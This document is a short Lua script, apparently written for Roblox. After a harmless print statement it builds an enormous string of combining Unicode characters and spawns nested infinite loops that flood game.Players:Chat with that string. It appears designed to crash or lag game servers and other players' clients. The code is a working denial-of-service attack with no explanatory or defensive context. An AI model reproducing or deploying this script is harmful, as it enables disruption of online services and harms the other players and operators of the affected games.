print('hi')

spawn(function()
        while wait() do
    spawn(function()
            local malformed = string.rep('ᴭ᷁᷁᷁ᴭ᷁ᴭ᷁᷁᷁ᴭ᷁᷁᷁ᴭ᷁᷁᷁ᴭ᷁ᴭ᷁᷁᷁ᴭ᷁᷁᷁ᴭᴭ᷁᷁᷁ᴭ᷁᷁᷁ᴭ᷁᷁᷁ᴭᴭ᷁᷁᷁ᴭ᷁᷁᷁ᴭ᷁᷁᷁ᴭ᷁᷁᷁ᴭ᷁᷁᷁ᴭ᷁᷁᷁ᴭ᷁᷁᷁ᴭ᷁᷁᷁ᴭ᷁᷁᷁ᴭ᷁᷁᷁ก็็็▌▓', 90900)
        local packets = 80
        c = 0
        for i = 1, packets/4 do
            wait(0.1)
            for i = 1, packets - (packets/4) do
                spawn(function()
                    while wait() do
                        c = c+1
                        if c == 20 then
                            c = 0 
                            game:GetService('RunService').RenderStepped:Wait()
                        end
                        pcall(function()
                            game.Players:Chat(malformed)
                        end)
                    end
                end)
            end
        end
    end)
end
end)
